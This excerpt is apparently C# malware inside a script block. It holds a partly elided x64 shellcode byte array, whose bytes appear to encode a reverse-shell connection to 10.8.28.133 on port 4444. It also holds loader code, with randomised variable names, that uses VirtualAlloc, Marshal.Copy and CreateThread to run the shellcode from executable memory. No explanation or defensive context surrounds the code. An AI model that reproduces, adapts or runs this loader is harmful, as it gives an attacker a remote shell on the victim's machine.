...
0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,
...
0x48,0x01,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,
...
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x0a,0x08,0x1c,0x85,
...
0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
        ...
        IntPtr kcUYLDRceX = VirtualAlloc(IntPtr.Zero,(UIntPtr)lrNpInwXbf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lrNpInwXbf,0,kcUYLDRceX,lrNpInwXbf.Length);
        IntPtr cZGu6rQsxof = IntPtr.Zero;
        IntPtr cwf = CreateThread(IntPtr.Zero,UIntPtr.Zero,kcUYLDRceX,IntPtr.Zero,0,ref cZGu6rQsxof);
    }
</script>
